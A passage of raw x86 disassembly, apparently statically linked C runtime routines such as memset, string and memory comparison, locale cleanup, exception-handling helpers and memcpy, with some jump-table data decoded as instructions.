  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
